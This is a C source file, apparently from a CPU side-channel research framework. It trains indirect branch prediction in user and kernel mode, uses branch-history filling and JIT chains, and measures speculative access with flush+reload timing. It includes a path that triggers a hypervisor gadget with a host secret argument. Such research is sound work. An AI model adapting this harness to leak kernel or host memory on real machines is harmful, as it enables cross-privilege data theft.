#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#include "lib.h"
#include "flush_and_reload.h"
#include "jitting.h"
#include "helper.h"


extern void fill_bhb_jmp(uint8_t *history, void * caller_function,
                     void * target_function, void * arg1);

extern void enter_jit_chain(void * jit_entry, void * caller_function,
                    void * target_function, void * fr_buf_p, void * do_rsb_underflow,
                    void * jmp_history);

typedef uint64_t (*jit_entry_t)(void * target_function, void * arg1,
                            void * caller_function);

typedef uint64_t (*evict_entry_t)(void);


static __attribute__((__noinline__))
int trigger_as_kernel(config * cfg, uint64_t history_idx, void * caller, void * target) {

    char buf[17];
    void * args[7];
    int ret;
    uint8_t * history;
    uint8_t * jit_entry;
    uint8_t rsb_underflow;
    uint8_t history_type;

    args[0] = enter_jit_chain;

    args[3] = target;
    args[4] = cfg->fr_buf_p;
    args[5] = 0;

    history_type = history_idx == 0 ? cfg->caller0_history_type : cfg->caller1_history_type;

    if (history_type == HISTORY_NONE) {
        args[1] = caller;
        args[2] = NULL;
        args[5] = (void *) history_idx;
        args[6] = NULL;

    } else if (history_type == HISTORY_STATIC_CONDITIONAL) {

        history = history_idx == 0 ? cfg->history_0 : cfg->history_1;

        args[1] = fill_bhb_jmp;
        args[2] = caller;
        args[6] = (void *) history;

    } else if (history_type == HISTORY_JIT) {

        jit_entry = history_idx == 0 ? cfg->history_jit_entry_0 : cfg->history_jit_entry_1;

        args[1] = jit_entry;
        args[2] = caller;
        args[6] = NULL;

    }


    snprintf(buf, 17, "%lx", (size_t) args);

    ret = pwrite(cfg->fd_kernel_exec, buf, sizeof(buf), 0);

    if (ret <= 0) {
        printf("[ERROR] Kernel executing address %p failed: %s (%d)\n", caller, strerror(errno), errno);
        exit(EXIT_FAILURE);
    }

    cpuid();

    return 0;

}

static __attribute__((__noinline__))
void trigger_user_target(config * cfg, uint64_t history_idx,  void * caller, void * target)
{
    uint8_t * history;
    uint8_t * jit_entry;
    uint8_t history_type;

    history_type = history_idx == 0 ? cfg->caller0_history_type : cfg->caller1_history_type;

    if (history_type == HISTORY_NONE) {

        enter_jit_chain(caller, NULL, target, cfg->fr_buf_p, (void *) history_idx, NULL);

    } else if (history_type == HISTORY_STATIC_CONDITIONAL) {

        history = history_idx == 0 ? cfg->history_0 : cfg->history_1;

        enter_jit_chain(fill_bhb_jmp, caller, target, cfg->fr_buf_p, (void *) 0, history);

    } else if (history_type == HISTORY_JIT) {

        jit_entry = history_idx == 0 ? cfg->history_jit_entry_0 : cfg->history_jit_entry_1;

        enter_jit_chain(jit_entry, caller, target, cfg->fr_buf_p, (void *) 0, NULL);

    }

    cpuid();


}

void walk_caller_evict_list(struct config * cfg, int history_idx, void * caller_evict_list[], int set_size) {

    for (size_t i = 0; i < set_size; i++)
    {
        if (caller_evict_list[i]) {

            trigger_user_target(cfg, history_idx, caller_evict_list[i],  0);
            trigger_user_target(cfg, history_idx, caller_evict_list[i],  0);
        }
    }

}


void evict_pc_entry(struct config * cfg) {
    walk_caller_evict_list(cfg, 0, cfg->caller_evict_list_pc, MAX_CALLER_EVICT_PC_SET);
}


void do_flush_and_reload(config * cfg, uint64_t hits[], uint64_t iterations)
{

    uint64_t t;

    uint8_t * caller0 = (uint8_t *) cfg->caller0 + MAX_ENTRY_OFFSET - cfg->caller0_entry_offset;
    uint8_t * caller1 = (uint8_t *) cfg->caller1 + MAX_ENTRY_OFFSET - cfg->caller1_entry_offset;

    for (int i = 0; i < N_FR_BUF; i++){ hits[i] = 0; }

    set_ibpb(cfg->cpu_nr);

    for(int iter=0; iter < iterations; iter++) {

        evict_pc_entry(cfg);

        if (cfg->train_in_kernel) {
            trigger_as_kernel(cfg, 0, cfg->caller0, &cfg->target0);
            trigger_as_kernel(cfg, 0, cfg->caller0, &cfg->target0);
        } else {
            trigger_user_target(cfg, 0, caller0, &cfg->target0);
            trigger_user_target(cfg, 0, caller0, &cfg->target0);
        }

        flush(&cfg->ftable1[0]);
        for (int i = 0; i < N_FR_BUF; i++){ flush(cfg->fr_buf[i]); }

        mfence();


        if (cfg->test_in_kernel == 1) {
            trigger_as_kernel(cfg, 1, caller1, &cfg->ftable1[0]);
        } else if (cfg->test_in_kernel == 2) {
            do_vmcall(cfg->fd_vmcall, OPTION_TRIGGER_GADGET, (uint64_t) cfg->host_arg_secret, (uint64_t) cfg->host_arg_fr_buf);
        } else {
            trigger_user_target(cfg, 1, caller1, &cfg->ftable1[0]);
        }


        cpuid();

        for (int i = 0; i < N_FR_BUF; i++)
        {
            if (i > 0 && cfg->fr_buf[i- 1] == cfg->fr_buf[i]) {
                continue;
            }
            t = load_time(cfg->fr_buf[i]);
            if(t < THR) {
                hits[i]++;
            }
        }

    }

}
